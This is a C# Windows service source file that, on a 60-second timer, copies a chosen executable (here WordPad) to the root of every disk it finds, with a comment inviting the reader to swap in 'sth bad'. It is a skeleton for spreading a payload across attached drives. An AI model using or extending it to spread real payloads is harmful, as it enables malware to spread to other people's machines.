using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using DJ;

namespace FileBroadcaster
{
    public partial class Broadcaster : ServiceBase
    {
        private string fileToBroadcast= @"C:\Windows\write.exe"; //this is wordpad file. You can replace it for sth bad :p
        public Broadcaster()
        {
            InitializeComponent();
            eventLog1 = new System.Diagnostics.EventLog();
            if (!System.Diagnostics.EventLog.SourceExists("BroadcasterSource"))
            {
                System.Diagnostics.EventLog.CreateEventSource(
                    "BroadcasterSource", "BroadcasterNewLog");
            }
            eventLog1.Source = "BroadcasterSource";
            eventLog1.Log = "BroadcasterNewLog";
        }

        protected override void OnStart(string[] args)
        {
            eventLog1.WriteEntry("Broadcaster was started successfully");
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 60000; // 60 seconds
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
        }

        private void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                if (File.Exists(fileToBroadcast))
                {
                    string filename = Path.GetFileName(fileToBroadcast);
                    List<Disk> disks = WmiMapper.GetDisks();
                    foreach (Disk disk in disks)
                    {
                        string outputPath = disk.DeviceId + "\\" + filename;
                        if (!File.Exists(outputPath))
                        {
                            File.Copy(fileToBroadcast, outputPath);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (!string.IsNullOrEmpty(ex.Message))
                {
                    eventLog1.WriteEntry($"{ex.Message}");
                }
                
            }
        }

        protected override void OnStop()
        {
            eventLog1.WriteEntry("Broadcaster was stopped successfully");
        }
    }
}
